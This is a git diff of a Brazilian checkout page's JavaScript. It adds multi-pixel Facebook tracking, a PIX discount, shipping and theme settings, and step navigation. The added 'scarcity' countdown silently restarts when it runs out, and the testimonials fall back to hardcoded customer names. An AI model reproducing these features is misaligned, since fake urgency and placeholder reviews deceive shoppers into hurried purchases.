@@ -15,31 +15,586 @@ document.addEventListener('DOMContentLoaded', () => {
     localStorage.setItem('checkout_session_id', checkoutSessionId);
   }
 
+  let discountPixPercent = 10;
+  let dbWaStoreName = 'Nome da Loja';
+  let dbWaMsgPix = `Olá {nome} tudo bem? 😁
+
+Parabéns, você escolheu um produto incrível! 🤩
+
+📦 O seu pedido já está sendo reservado, só estamos esperando a confirmação do pagamento para prepararmos o envio.
+
+📌 Detalhes do Pedido: {pedido}
+{produtos}
+
+🏷️ Pagamento: PIX
+💵 Valor: {valor}
+
+⚠️ Caso seu código PIX tenha expirado é só gerar um novo.
+
+Se preferir pode usar outras formas de pagamento como Boleto ou Cartão. 
+
+Obs: Caso já tenha realizado o pagamento, enviaremos uma mensagem confirmando a compra :)`;
+
   // Inicialização dinâmica do Facebook Pixel
   function loadFacebookPixel(pixelId) {
     if (!pixelId) return;
     
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
+    if (!window.fbq) {
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+    }
     
     fbq('init', pixelId);
-    fbq('track', 'PageView');
-    console.log(`🎯 Facebook Pixel ${pixelId} inicializado com sucesso e PageView registrado.`);
+    fbq('trackSingle', pixelId, 'PageView');
+    console.log(`🎯 Facebook Pixel ${pixelId} inicializado com trackSingle PageView.`);
   }
 
   // Disparar evento de rastreamento do Pixel
   function trackPixelEvent(eventName, eventData = {}) {
     if (window.fbq) {
-      fbq('track', eventName, eventData);
-      console.log(`🎯 Facebook Pixel evento '${eventName}' enviado com dados:`, eventData);
+      if (window.facebookPixels && window.facebookPixels.length > 0) {
+        window.facebookPixels.forEach(p => {
+          if (p.id) {
+            fbq('trackSingle', p.id, eventName, eventData);
+            console.log(`🎯 Facebook Pixel ${p.id} evento '${eventName}' enviado via trackSingle:`, eventData);
+          }
+        });
+      } else {
+        fbq('track', eventName, eventData);
+        console.log(`🎯 Facebook Pixel evento '${eventName}' enviado via fbq('track'):`, eventData);
+      }
     } else {
       console.log(`⚠️ fbq indisponível. Ignorando evento '${eventName}'`);
+    }
+  }
+
+  // Atualizar opções de frete dinamicamente
+  function updateShippingOptionsDOM(data) {
+    const stdOption = document.querySelector('input[name="shipping_method"][value="standard"]');
+    if (stdOption) {
+      const stdParent = stdOption.closest('.shipping-option');
+      if (stdParent) {
+        const titleSpan = stdParent.querySelector('.option-title');
+        const timeSpan = stdParent.querySelector('.option-time');
+        const priceSpan = stdParent.querySelector('.option-price');
+        
+        if (titleSpan && data.shipping_standard_name) titleSpan.textContent = data.shipping_standard_name;
+        if (timeSpan && data.shipping_standard_time) timeSpan.textContent = data.shipping_standard_time;
+        if (priceSpan && data.shipping_standard_price !== undefined) {
+          const price = parseFloat(data.shipping_standard_price) || 0;
+          priceSpan.setAttribute('data-price', price.toFixed(2));
+          priceSpan.textContent = price === 0 ? 'Grátis' : price.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        }
+      }
+    }
+
+    const expOption = document.querySelector('input[name="shipping_method"][value="express"]');
+    if (expOption) {
+      const expParent = expOption.closest('.shipping-option');
+      if (expParent) {
+        const titleSpan = expParent.querySelector('.option-title');
+        const timeSpan = expParent.querySelector('.option-time');
+        const priceSpan = expParent.querySelector('.option-price');
+        
+        if (titleSpan && data.shipping_express_name) titleSpan.textContent = data.shipping_express_name;
+        if (timeSpan && data.shipping_express_time) timeSpan.textContent = data.shipping_express_time;
+        if (priceSpan && data.shipping_express_price !== undefined) {
+          const price = parseFloat(data.shipping_express_price) || 0;
+          priceSpan.setAttribute('data-price', price.toFixed(2));
+          priceSpan.textContent = price === 0 ? 'Grátis' : price.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        }
+      }
+    }
+
+    if (typeof calculateTotals === 'function') {
+      calculateTotals();
+    }
+  }
+
+  // Função para aplicar as configurações personalizadas de tema visual do checkout
+  function applyThemeConfig(config) {
+    if (!config) return;
+    
+    // 1. Tipografia (Google Fonts)
+    if (config.typography) {
+      const fontId = 'dynamic-google-font';
+      let linkEl = document.getElementById(fontId);
+      if (!linkEl) {
+        linkEl = document.createElement('link');
+        linkEl.id = fontId;
+        linkEl.rel = 'stylesheet';
+        document.head.appendChild(linkEl);
+      }
+      linkEl.href = `https://fonts.googleapis.com/css2?family=${encodeURIComponent(config.typography)}:wght@300;400;500;600;700&display=swap`;
+    }
+
+    // Helper para escurecer cor (para hover dos botões primários)
+    function darkenColor(hex, percent) {
+      try {
+        hex = hex.replace('#', '');
+        let r = parseInt(hex.substring(0, 2), 16);
+        let g = parseInt(hex.substring(2, 4), 16);
+        let b = parseInt(hex.substring(4, 6), 16);
+
+        r = Math.max(0, Math.min(255, Math.floor(r * (1 - percent / 100))));
+        g = Math.max(0, Math.min(255, Math.floor(g * (1 - percent / 100))));
+        b = Math.max(0, Math.min(255, Math.floor(b * (1 - percent / 100))));
+
+        const rHex = r.toString(16).padStart(2, '0');
+        const gHex = g.toString(16).padStart(2, '0');
+        const bHex = b.toString(16).padStart(2, '0');
+
+        return `#${rHex}${gHex}${bHex}`;
+      } catch (e) {
+        return hex;
+      }
+    }
+
+    // 2. Injeção de Estilos Dinâmicos (CSS Variables & Overrides)
+    const styleEl = document.getElementById('dynamic-checkout-styles');
+    if (styleEl) {
+      const primaryColor = config.colorPrimary || '#164620';
+      const primaryHover = config.colorPrimary ? darkenColor(config.colorPrimary, 10) : '#0f3016';
+      
+      let cssRules = `
+        :root {
+          --primary-color: ${primaryColor} !important;
+          --primary-hover: ${primaryHover} !important;
+          --text-primary: ${config.colorTextMain || '#111827'} !important;
+          --text-secondary: ${config.colorTextMuted || '#6b7280'} !important;
+          --bg-color: ${config.colorPageBg || '#f4f6fa'} !important;
+          --panel-bg: ${config.stepBgColor || '#ffffff'} !important;
+          --panel-border: ${config.stepBorderColor || '#e5e7eb'} !important;
+          --border-radius: ${config.stepBorderRadius || '12px'} !important;
+        }
+      `;
+
+      if (config.typography) {
+        cssRules += `
+          :root {
+            --font-sans: '${config.typography}', sans-serif !important;
+          }
+          body, input, select, button, textarea {
+            font-family: '${config.typography}', var(--font-sans) !important;
+          }
+        `;
+      }
+
+      // Adicionar cor de fundo do cabeçalho
+      if (config.colorHeaderBg) {
+        cssRules += `
+          #checkout-header-element {
+            background-color: ${config.colorHeaderBg} !important;
+            ${config.colorHeaderBg !== 'transparent' && config.colorHeaderBg !== '' ? 'padding: 15px 20px !important; border-radius: 12px !important;' : ''}
+          }
+        `;
+      }
+
+      // Alinhamento do logotipo
+      if (config.logoCenter) {
+        cssRules += `
+          #checkout-header-element {
+            position: relative !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: space-between !important;
+          }
+          #checkout-logo-container {
+            width: 100% !important;
+            justify-content: center !important;
+            display: flex !important;
+          }
+          #back-to-store-link {
+            position: absolute !important;
+            left: 0 !important;
+            z-index: 10 !important;
+          }
+          #checkout-env-badge {
+            position: absolute !important;
+            right: 0 !important;
+            z-index: 10 !important;
+          }
+          @media (max-width: 768px) {
+            #checkout-header-element {
+              flex-direction: column !important;
+              gap: 12px !important;
+              align-items: center !important;
+            }
+            #back-to-store-link, #checkout-env-badge {
+              position: static !important;
+            }
+          }
+        `;
+      } else {
+        cssRules += `
+          #checkout-header-element {
+            display: flex !important;
+            align-items: center !important;
+            justify-content: flex-start !important;
+            gap: 20px !important;
+          }
+          #checkout-logo-container {
+            display: flex !important;
+            justify-content: flex-start !important;
+            width: auto !important;
+          }
+          #checkout-env-badge {
+            margin-left: auto !important;
+          }
+          @media (max-width: 768px) {
+            #checkout-header-element {
+              flex-direction: column !important;
+              gap: 12px !important;
+              align-items: center !important;
+            }
+            #checkout-env-badge {
+              margin-left: 0 !important;
+            }
+          }
+        `;
+      }
+
+      // Estilos customizados para o botão de checkout
+      cssRules += `
+        #btn-submit-checkout.style-glow {
+          box-shadow: 0 0 15px var(--primary-color) !important;
+          animation: pulse-glow-btn 2s infinite !important;
+        }
+        #btn-submit-checkout.style-gradient {
+          background: linear-gradient(135deg, var(--primary-color) 0%, #1d4ed8 100%) !important;
+          border: none !important;
+        }
+        @keyframes pulse-glow-btn {
+          0% { box-shadow: 0 0 0 0 rgba(124, 77, 255, 0.4); }
+          70% { box-shadow: 0 0 0 10px rgba(124, 77, 255, 0); }
+          100% { box-shadow: 0 0 0 0 rgba(124, 77, 255, 0); }
+        }
+      `;
+
+      // Estilos customizados de rodapé
+      if (config.footerBgColor) {
+        cssRules += `
+          #checkout-footer-element {
+            background-color: ${config.footerBgColor} !important;
+            --footer-bg: ${config.footerBgColor} !important;
+          }
+        `;
+      }
+      if (config.footerTextColor) {
+        cssRules += `
+          #checkout-footer-element {
+            color: ${config.footerTextColor} !important;
+            --footer-color: ${config.footerTextColor} !important;
+          }
+          #checkout-footer-element h3,
+          #checkout-footer-element p,
+          #checkout-footer-element span,
+          #checkout-footer-element i {
+            color: ${config.footerTextColor} !important;
+          }
+        `;
+      }
+
+      styleEl.innerHTML = cssRules;
+    }
+
+    // 3. Logomarca e Favicon
+    const customLogoImg = document.getElementById('checkout-custom-logo');
+    const logoIcon = document.getElementById('checkout-logo-icon');
+    const logoText = document.getElementById('checkout-logo-text');
+    
+    if (config.logo) {
+      if (customLogoImg) {
+        customLogoImg.src = config.logo;
+        customLogoImg.classList.remove('hide');
+        const logoWidth = config.logoWidth || 130;
+        const logoHeight = Math.round((150 / 130) * logoWidth);
+        customLogoImg.style.width = logoWidth + 'px';
+        customLogoImg.style.height = 'auto';
+        customLogoImg.style.maxWidth = '100%';
+        customLogoImg.style.maxHeight = logoHeight + 'px';
+        customLogoImg.style.objectFit = 'contain';
+      }
+      const logoContainer = document.getElementById('checkout-logo-container');
+      if (logoContainer) {
+        if (config.logoCenter) {
+          logoContainer.style.justifyContent = 'center';
+          logoContainer.style.width = '100%';
+        } else {
+          logoContainer.style.justifyContent = 'flex-start';
+          logoContainer.style.width = 'auto';
+        }
+      }
+      if (logoIcon) logoIcon.classList.add('hide');
+      if (logoText) logoText.classList.add('hide');
+    } else {
+      if (customLogoImg) {
+        customLogoImg.src = '';
+        customLogoImg.classList.add('hide');
+      }
+      if (logoIcon) logoIcon.classList.remove('hide');
+      if (logoText) logoText.classList.remove('hide');
+    }
+
+    if (config.favicon) {
+      let favLink = document.querySelector("link[rel*='icon']");
+      if (!favLink) {
+        favLink = document.createElement('link');
+        favLink.rel = 'icon';
+        document.head.appendChild(favLink);
+      }
+      favLink.href = config.favicon;
+    }
+
+    // 4. Barra de Avisos
+    const annBar = document.getElementById('announcement-bar-checkout');
+    if (annBar) {
+      if (config.announcementActive) {
+        annBar.innerText = config.announcementText || 'FRETE GRÁTIS hoje para todo o Brasil!';
+        annBar.style.background = config.announcementBg || '#7c4dff';
+        annBar.style.color = config.announcementColor || '#ffffff';
+        annBar.classList.remove('hide');
+      } else {
+        annBar.classList.add('hide');
+      }
+    }
+
+    // 5. Botão Voltar para a Loja (Integrado no Logotipo)
+    const backLink = document.getElementById('back-to-store-link');
+    const backLogoLink = document.getElementById('back-to-store-logo-link');
+    const backText = document.getElementById('back-to-store-text');
+    
+    if (backLogoLink) {
+      backLogoLink.href = config.backLinkUrl || '#';
+    }
+    if (backLink) {
+      if (config.backLinkActive) {
+        backLink.href = config.backLinkUrl || '#';
+        if (backText) backText.innerText = config.backLinkText || 'Voltar para a Loja';
+        backLink.classList.remove('hide');
+      } else {
+        backLink.classList.add('hide');
+      }
+    }
+
+    // 6. Banners Promocionais (com Resize Listener)
+    const promoBanner = document.getElementById('checkout-promo-banner');
+    const bannerDesktop = document.getElementById('checkout-banner-desktop');
+    const bannerMobile = document.getElementById('checkout-banner-mobile');
+    
+    if (promoBanner) {
+      if (config.bannerActive) {
+        promoBanner.classList.remove('hide');
+        
+        function updateBannerSource() {
+          const isMobileViewport = window.innerWidth < 768;
+          if (isMobileViewport) {
+            if (bannerDesktop) bannerDesktop.classList.add('hide');
+            if (bannerMobile) {
+              bannerMobile.src = config.bannerMobile || config.bannerDesktop || '';
+              if (bannerMobile.src) {
+                bannerMobile.classList.remove('hide');
+              } else {
+                bannerMobile.classList.add('hide');
+              }
+            }
+          } else {
+            if (bannerMobile) bannerMobile.classList.add('hide');
+            if (bannerDesktop) {
+              bannerDesktop.src = config.bannerDesktop || config.bannerMobile || '';
+              if (bannerDesktop.src) {
+                bannerDesktop.classList.remove('hide');
+              } else {
+                bannerDesktop.classList.add('hide');
+              }
+            }
+          }
+        }
+        
+        updateBannerSource();
+        // Evitar múltiplos event listeners acumulando
+        window.removeEventListener('resize', window._updateBannerSourceFn);
+        window._updateBannerSourceFn = updateBannerSource;
+        window.addEventListener('resize', window._updateBannerSourceFn);
+      } else {
+        promoBanner.classList.add('hide');
+        if (bannerDesktop) bannerDesktop.classList.add('hide');
+        if (bannerMobile) bannerMobile.classList.add('hide');
+      }
+    }
+
+    // 7. Cronômetro de Escassez
+    const scarcityBar = document.getElementById('checkout-urgency-timer');
+    const scarcityMessage = document.getElementById('checkout-timer-message');
+    const scarcityCountdown = document.getElementById('checkout-timer-countdown');
+    const scarcityProgress = document.getElementById('checkout-timer-progress');
+    
+    if (scarcityBar) {
+      if (config.scarcityActive) {
+        scarcityBar.classList.remove('hide');
+        if (scarcityMessage) scarcityMessage.innerText = config.scarcityText || 'Desconto reservado! Garanta antes que o tempo acabe:';
+        if (scarcityProgress) scarcityProgress.style.background = config.scarcityBarColor || '#ef4444';
+        
+        // Timer de escassez persistente na sessão
+        const durationSec = (parseInt(config.scarcityDuration) || 15) * 60;
+        const nowSec = Math.floor(Date.now() / 1000);
+        let expiryTime = sessionStorage.getItem('checkout_timer_expiry');
+        
+        if (!expiryTime) {
+          expiryTime = nowSec + durationSec;
+          sessionStorage.setItem('checkout_timer_expiry', expiryTime);
+        } else {
+          expiryTime = parseInt(expiryTime);
+          if (expiryTime < nowSec) {
+            expiryTime = nowSec + durationSec;
+            sessionStorage.setItem('checkout_timer_expiry', expiryTime);
+          }
+        }
+        
+        if (window._scarcityTimerInterval) {
+          clearInterval(window._scarcityTimerInterval);
+        }
+        
+        function tickTimer() {
+          const currentNow = Math.floor(Date.now() / 1000);
+          const secondsLeft = expiryTime - currentNow;
+          
+          if (secondsLeft <= 0) {
+            clearInterval(window._scarcityTimerInterval);
+            if (scarcityCountdown) scarcityCountdown.innerText = '00:00';
+            if (scarcityProgress) scarcityProgress.style.width = '0%';
+          } else {
+            const m = String(Math.floor(secondsLeft / 60)).padStart(2, '0');
+            const s = String(secondsLeft % 60).padStart(2, '0');
+            if (scarcityCountdown) scarcityCountdown.innerText = `${m}:${s}`;
+            
+            const percent = (secondsLeft / durationSec) * 100;
+            if (scarcityProgress) scarcityProgress.style.width = `${percent}%`;
+          }
+        }
+        
+        tickTimer();
+        window._scarcityTimerInterval = setInterval(tickTimer, 1000);
+      } else {
+        scarcityBar.classList.add('hide');
+        if (window._scarcityTimerInterval) {
+          clearInterval(window._scarcityTimerInterval);
+        }
+      }
+    }
+
+    // 8. Depoimentos de Clientes
+    const testimonialsBox = document.getElementById('checkout-testimonials-container');
+    const testimonialsTitle = document.getElementById('checkout-testimonials-title');
+    
+    if (testimonialsBox) {
+      if (config.summaryShowTestimonials) {
+        testimonialsBox.classList.remove('hide');
+        if (testimonialsTitle) testimonialsTitle.innerText = config.testimonialsTitle || 'O que dizem nossos clientes:';
+        
+        const t1Name = document.getElementById('checkout-testimonial-1-name');
+        const t1Text = document.getElementById('checkout-testimonial-1-text');
+        if (t1Name) t1Name.innerText = config.testimonial1Name || 'Mariana Silva';
+        if (t1Text) t1Text.innerText = config.testimonial1Text || '';
+        
+        const t2Name = document.getElementById('checkout-testimonial-2-name');
+        const t2Text = document.getElementById('checkout-testimonial-2-text');
+        if (t2Name) t2Name.innerText = config.testimonial2Name || 'Carlos Eduardo';
+        if (t2Text) t2Text.innerText = config.testimonial2Text || '';
+        
+        const t3Name = document.getElementById('checkout-testimonial-3-name');
+        const t3Text = document.getElementById('checkout-testimonial-3-text');
+        if (t3Name) t3Name.innerText = config.testimonial3Name || 'Beatriz Souza';
+        if (t3Text) t3Text.innerText = config.testimonial3Text || '';
+      } else {
+        testimonialsBox.classList.add('hide');
+      }
+    }
+
+    // 9. Customização do Botão de Envio Principal
+    const submitBtn = document.getElementById('btn-submit-checkout');
+    if (submitBtn) {
+      const btnTextSpan = submitBtn.querySelector('.btn-text');
+      if (btnTextSpan) {
+        let iconHtml = '';
+        if (config.btnLockIcon) {
+          iconHtml = '<i class="fa-solid fa-lock" style="margin-right: 8px;"></i>';
+        }
+        btnTextSpan.innerHTML = iconHtml + (config.btnText || 'Finalizar Compra');
+      }
+      
+      submitBtn.classList.remove('style-glow', 'style-gradient');
+      if (config.btnStyle === 'glow') {
+        submitBtn.classList.add('style-glow');
+      } else if (config.btnStyle === 'gradient') {
+        submitBtn.classList.add('style-gradient');
+      }
+    }
+
+    // 10. Produto Customizado no Resumo da Compra (se não for Shopify redirect)
+    const urlParams = new URLSearchParams(window.location.search);
+    const hasShopifyProduct = urlParams.get('title') && urlParams.get('price');
+    
+    if (!hasShopifyProduct) {
+      const prodName = document.getElementById('checkout-product-name-val');
+      const prodSize = document.getElementById('checkout-product-size-val');
+      const prodPriceEl = document.getElementById('checkout-product-price-val');
+      const baseAmountInput = document.getElementById('base-amount');
+      
+      const customPrice = parseFloat(config.productPrice !== undefined ? config.productPrice : 129.90);
+      const customName = config.productName || 'Pacote Sandbox Elite';
+      const customSize = config.productSize || 'Acesso para testes ilimitados';
+      
+      if (prodName) prodName.textContent = customName;
+      if (prodSize) prodSize.textContent = customSize;
+      
+      const qtyValEl = document.getElementById('checkout-qty-val');
+      const qty = parseInt(qtyValEl ? qtyValEl.textContent : 1) || 1;
+      
+      const formattedPrice = 'R$ ' + (customPrice * qty).toFixed(2).replace('.', ',');
+      if (prodPriceEl) prodPriceEl.textContent = formattedPrice;
+      
+      if (baseAmountInput) {
+        baseAmountInput.value = (customPrice * qty).toFixed(2);
+        // Force calculation
+        if (typeof calculateTotals === 'function') {
+          calculateTotals();
+        }
+      }
+    }
+
+    // Rodapé Customizável da Loja
+    const footerStoreNameText = document.getElementById('footer-store-name-text');
+    const footerStoreCnpjText = document.getElementById('footer-store-cnpj-text');
+    const footerStoreAddressText = document.getElementById('footer-store-address-text');
+    const footerStoreContactText = document.getElementById('footer-store-contact-text');
+    const footerStoreCopyright = document.getElementById('footer-store-copyright');
+    const footerYear = document.getElementById('footer-year');
+
+    if (footerYear) {
+      footerYear.innerText = new Date().getFullYear();
+    }
+    if (config.footerStoreName) {
+      if (footerStoreNameText) footerStoreNameText.innerText = config.footerStoreName;
+      if (footerStoreCopyright) footerStoreCopyright.innerText = config.footerStoreName;
+    }
+    if (config.footerStoreCnpj) {
+      if (footerStoreCnpjText) footerStoreCnpjText.innerText = `CNPJ: ${config.footerStoreCnpj}`;
+    }
+    if (config.footerStoreAddress) {
+      if (footerStoreAddressText) footerStoreAddressText.innerText = config.footerStoreAddress;
+    }
+    if (config.footerStoreEmail || config.footerStorePhone) {
+      const emailPart = config.footerStoreEmail ? `E-mail: ${config.footerStoreEmail}` : '';
+      const phonePart = config.footerStorePhone ? `Telefone: ${config.footerStorePhone}` : '';
+      const spacer = (emailPart && phonePart) ? ' | ' : '';
+      if (footerStoreContactText) footerStoreContactText.innerText = `${emailPart}${spacer}${phonePart}`;
     }
   }
 
@@ -49,10 +604,56 @@ document.addEventListener('DOMContentLoaded', () => {
       const res = await fetch('/api/config');
       if (res.ok) {
         const data = await res.json();
-        if (data.facebook_pixel_id) {
-          window.facebookPixelId = data.facebook_pixel_id;
-          loadFacebookPixel(data.facebook_pixel_id);
+        // Múltiplos Pixels
+        window.facebookPixels = [];
+        if (data.facebook_pixels) {
+          try {
+            window.facebookPixels = JSON.parse(data.facebook_pixels);
+          } catch (e) {
+            console.error('Erro ao ler facebook_pixels no checkout:', e);
+          }
         }
+        
+        // Sincronização inicial de retrocompatibilidade
+        if (window.facebookPixels.length === 0 && data.facebook_pixel_id) {
+          window.facebookPixels.push({ id: data.facebook_pixel_id, token: data.facebook_pixel_token });
+        }
+
+        // Inicializar todos os pixels
+        if (window.facebookPixels.length > 0) {
+          window.facebookPixels.forEach(p => {
+            if (p.id) {
+              loadFacebookPixel(p.id);
+            }
+          });
+        }
+
+        if (data.discount_pix_percent !== undefined) {
+          discountPixPercent = parseFloat(data.discount_pix_percent) || 0;
+        }
+        
+        if (data.checkout_wa_store_name) {
+          dbWaStoreName = data.checkout_wa_store_name;
+        }
+        if (data.checkout_wa_msg_pix) {
+          dbWaMsgPix = data.checkout_wa_msg_pix;
+        }
+        
+        // Atualizar fretes com dados reais do banco
+        updateShippingOptionsDOM(data);
+
+        // Carregar configurações de tema visual personalizado
+        if (data.checkout_theme_config) {
+          try {
+            const themeConfig = JSON.parse(data.checkout_theme_config);
+            window._currentThemeConfig = themeConfig;
+            applyThemeConfig(themeConfig);
+          } catch (e) {
+            console.error('Erro ao ler checkout_theme_config:', e);
+          }
+        }
+        // Recalcular totais na carga inicial com dados reais de descontos carregados do banco de dados
+        calculateTotals();
       }
     } catch (err) {
       console.error('Erro ao inicializar configurações e Pixel:', err);
@@ -74,7 +675,12 @@ document.addEventListener('DOMContentLoaded', () => {
       const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
       shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
     }
-    const totalAmount = subtotal + shippingPrice;
+
+    let discountVal = 0;
+    if (selectedMethod === 'pix' && discountPixPercent > 0) {
+      discountVal = parseFloat((subtotal * (discountPixPercent / 100)).toFixed(2));
+    }
+    const totalAmount = parseFloat((subtotal + shippingPrice - discountVal).toFixed(2));
 
     const itemsPayload = shpfyProductTitle ? [
       {
@@ -143,6 +749,127 @@ document.addEventListener('DOMContentLoaded', () => {
   // ==========================================
   const sections = document.querySelectorAll('.checkout-section');
   
+  // Função para atualizar a barra de progresso horizontal superior
+  function updateTopProgressBar() {
+    const steps = document.querySelectorAll('.progress-step');
+    const lines = document.querySelectorAll('.progress-line');
+    
+    let activeStep = 1;
+    const activeSection = document.querySelector('.checkout-section.active');
+    if (activeSection) {
+      activeStep = parseInt(activeSection.getAttribute('data-step')) || 1;
+    }
+    
+    steps.forEach(step => {
+      const stepNum = parseInt(step.getAttribute('data-step'));
+      const iconEl = step.querySelector('.step-icon');
+      
+      if (stepNum < activeStep) {
+        step.classList.add('completed');
+        step.classList.remove('active');
+        if (iconEl) {
+          iconEl.innerHTML = '<i class="fa-solid fa-check"></i>';
+        }
+      } else if (stepNum === activeStep) {
+        step.classList.add('active');
+        step.classList.remove('completed');
+        if (iconEl) {
+          if (stepNum === 1) {
+            iconEl.innerHTML = '1';
+          } else if (stepNum === 2) {
+            iconEl.innerHTML = '2';
+          } else {
+            iconEl.innerHTML = '<i class="fa-solid fa-lock" style="font-size: 0.7rem;"></i>';
+          }
+        }
+      } else {
+        step.classList.remove('active', 'completed');
+        if (iconEl) {
+          if (stepNum === 2) {
+            iconEl.innerHTML = '2';
+          } else {
+            iconEl.innerHTML = '<i class="fa-solid fa-lock" style="font-size: 0.7rem;"></i>';
+          }
+        }
+      }
+    });
+    
+    lines.forEach(line => {
+      const lineNum = parseInt(line.getAttribute('data-line'));
+      if (lineNum < activeStep) {
+        line.classList.add('active');
+      } else {
+        line.classList.remove('active');
+      }
+    });
+  }
+
+  // Função para copiar dados digitados para o resumo compacto de etapas concluídas
+  function updateCompletedSummaries() {
+    // Step 1: Identificação
+    const nameVal = document.getElementById('customer_name').value.trim();
+    const emailVal = document.getElementById('customer_email').value.trim();
+    const phoneVal = document.getElementById('customer_phone').value.trim();
+    
+    const summaryName = document.getElementById('summary-val-name');
+    const summaryEmail = document.getElementById('summary-val-email');
+    const summaryPhone = document.getElementById('summary-val-phone');
+    
+    if (summaryName) summaryName.textContent = nameVal || '-';
+    if (summaryEmail) summaryEmail.textContent = emailVal || '-';
+    if (summaryPhone) summaryPhone.textContent = phoneVal || '-';
+    
+    // Step 2: Enviar para
+    const cepVal = document.getElementById('cep').value.trim();
+    const streetVal = document.getElementById('street').value.trim();
+    const numberVal = document.getElementById('street_number').value.trim();
+    const complementVal = document.getElementById('complement').value.trim();
+    const neighborhoodVal = document.getElementById('neighborhood').value.trim();
+    const cityVal = document.getElementById('city').value.trim();
+    const stateVal = document.getElementById('state').value;
+    
+    const summaryAddress = document.getElementById('summary-val-address');
+    const summaryCityCep = document.getElementById('summary-val-city-cep');
+    const summaryShipping = document.getElementById('summary-val-shipping');
+    
+    if (summaryAddress) {
+      summaryAddress.textContent = `${streetVal}, ${numberVal}${complementVal ? ', ' + complementVal : ''}`;
+    }
+    if (summaryCityCep) {
+      summaryCityCep.textContent = `${neighborhoodVal}, ${cityVal} - ${stateVal} | CEP: ${cepVal}`;
+    }
+    
+    // Obter descrição do frete selecionado
+    const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
+    if (selectedRadio && summaryShipping) {
+      const parentOption = selectedRadio.closest('.shipping-option');
+      const titleSpan = parentOption ? parentOption.querySelector('.option-title') : null;
+      const priceSpan = parentOption ? parentOption.querySelector('.option-price') : null;
+      if (titleSpan && priceSpan) {
+        summaryShipping.textContent = `${titleSpan.textContent} - ${priceSpan.textContent}`;
+      }
+    }
+  }
+
+  // Ouvinte de clique global para botões de editar etapa ("Editar" no resumo compacto)
+  document.addEventListener('click', (e) => {
+    const editBtn = e.target.closest('.btn-edit-step');
+    if (editBtn) {
+      e.preventDefault();
+      const stepNum = parseInt(editBtn.getAttribute('data-edit-step'));
+      const section = document.querySelector(`.checkout-section[data-step="${stepNum}"]`);
+      if (section) {
+        // Ativar a seção clicada e remover conclusão
+        sections.forEach(s => s.classList.remove('active'));
+        section.classList.add('active');
+        section.classList.remove('completed');
+        
+        // Atualiza a barra de progresso superior
+        updateTopProgressBar();
+      }
+    }
+  });
+
   // Avançar etapas clicando no botão "Continuar"
   const nextButtons = document.querySelectorAll('.next-step');
   nextButtons.forEach(btn => {
@@ -153,6 +880,9 @@ document.addEventListener('DOMContentLoaded', () => {
       
       // Valida os campos da seção atual antes de prosseguir
       if (validateSectionInputs(currentSection)) {
+        // Atualiza os resumos compactos com os novos dados
+        updateCompletedSummaries();
+
         currentSection.classList.remove('active');
         currentSection.classList.add('completed');
         
@@ -160,6 +890,9 @@ document.addEventListener('DOMContentLoaded', () => {
         if (nextSection) {
           nextSection.classList.add('active');
         }
+        
+        // Atualiza a barra de progresso superior
+        updateTopProgressBar();
 
         // --- Rastreamento do Funil & Salvamento de Rascunhos ---
         let subtotal = parseFloat(amountInput.value) || 0;
@@ -210,6 +943,9 @@ document.addEventListener('DOMContentLoaded', () => {
         prevSection.classList.add('active');
         prevSection.classList.remove('completed');
       }
+      
+      // Atualiza a barra de progresso superior
+      updateTopProgressBar();
     });
   });
 
@@ -226,6 +962,9 @@ document.addEventListener('DOMContentLoaded', () => {
         // Ativa a seção clicada
         section.classList.add('active');
         section.classList.remove('completed');
+        
+        // Atualiza a barra de progresso superior
+        updateTopProgressBar();
       }
     });
   });
@@ -346,18 +1085,39 @@ document.addEventListener('DOMContentLoaded', () => {
       // Atualizar input oculto
       paymentMethodInput.value = target;
 
-      // Mostrar/Ocultar campos no formulário
+      // Elementos do cartão para gerenciamento de required
+      const cardNum = document.getElementById('card_number');
+      const cardName = document.getElementById('card_holder');
+      const cardExp = document.getElementById('card_expiry');
+      const cardCvv = document.getElementById('card_cvv');
+
+      // Mostrar/Ocultar campos no formulário e gerenciar validação exigida
       if (target === 'card') {
         cardFields.classList.add('active');
         pixFields.classList.remove('active');
         virtualCardViewer.classList.add('active');
         pixVirtualViewer.classList.remove('active');
+
+        // Restaurar validação nativa nos campos de cartão
+        if (cardNum) cardNum.setAttribute('required', '');
+        if (cardName) cardName.setAttribute('required', '');
+        if (cardExp) cardExp.setAttribute('required', '');
+        if (cardCvv) cardCvv.setAttribute('required', '');
       } else {
         cardFields.classList.remove('active');
         pixFields.classList.add('active');
         virtualCardViewer.classList.remove('active');
         pixVirtualViewer.classList.add('active');
+
+        // Remover validação nativa para evitar bloqueio silencioso do HTML5 ao pagar com Pix
+        if (cardNum) cardNum.removeAttribute('required');
+        if (cardName) cardName.removeAttribute('required');
+        if (cardExp) cardExp.removeAttribute('required');
+        if (cardCvv) cardCvv.removeAttribute('required');
       }
+
+      // Recalcular totais para aplicar/remover desconto do Pix
+      calculateTotals();
     });
   });
 
@@ -419,6 +1179,17 @@ document.addEventListener('DOMContentLoaded', () => {
       buscarCEP(value);
     }
   });
+
+  // Listeners para Cidade e UF manuais e preview de CEP
+  const cityInput = document.getElementById('city');
+  const stateInput = document.getElementById('state');
+  if (cityInput && stateInput) {
+    cityInput.addEventListener('input', updateCepPreview);
+    stateInput.addEventListener('input', updateCepPreview);
+  }
+  
+  // Sincronizar o preview no carregamento da página
+  setTimeout(updateCepPreview, 200);
 
